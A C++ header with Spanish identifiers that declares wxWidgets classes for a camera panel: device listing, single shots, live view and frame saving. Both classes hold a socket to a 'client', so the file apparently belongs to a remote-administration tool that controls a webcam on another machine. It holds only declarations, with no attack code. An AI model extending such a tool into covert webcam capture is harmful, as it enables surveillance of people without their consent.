#ifndef __CAM_
#define __CAM_

#include "headers.hpp"
#include <wx/mstream.h>

namespace EnumCamMenu {
	enum Enum {
		ID_SingleShot = 10000,
		ID_Close,
		ID_Combo_Devices,
		ID_Refrescar_Lista,
		ID_Spawn_Frame,
		ID_Picture_Frame,
		ID_Iniciar_Live,
		ID_Detener_Live,
		ID_Guardar_Frame
	};
}

class panelPictureBox : public wxFrame {
	public:
		panelPictureBox(wxWindow* parent, wxString cTitle, int iCamIndex);
		~panelPictureBox() {
			if (this->cPictureBuffer) {
				delete[] cPictureBuffer;
				cPictureBuffer = nullptr;
			}
		};

		char* cPictureBuffer = nullptr;
		u_int iBufferSize = 0;
		bool isCalled = false;
		u_int uiWidth = 600;
		u_int uiHeight = 300;
		SOCKET sckCliente = INVALID_SOCKET;

		void OnDrawBuffer();
		void OnSingleShot(wxCommandEvent& event);
		void OnLive(wxCommandEvent& event);
		void OnStopLive(wxCommandEvent& event);
		void OnGuardarFrame(wxCommandEvent& event);

		wxStaticBitmap* imageCtrl = nullptr;

	private:
		void OnClose(wxCloseEvent& event);

		wxDECLARE_EVENT_TABLE();
};


class panelCamara : public wxPanel{
	public:
		panelCamara(wxWindow* pParent);

		void OnRefrescarLista(wxCommandEvent& event);
		void OnManageCam(wxCommandEvent& event);

		SOCKET sckCliente = INVALID_SOCKET;
		wxComboBox* cam_Devices = nullptr;
		panelPictureBox* pictureBox = nullptr;

	private:
		std::string strID = "";
		wxDECLARE_EVENT_TABLE();

};

#endif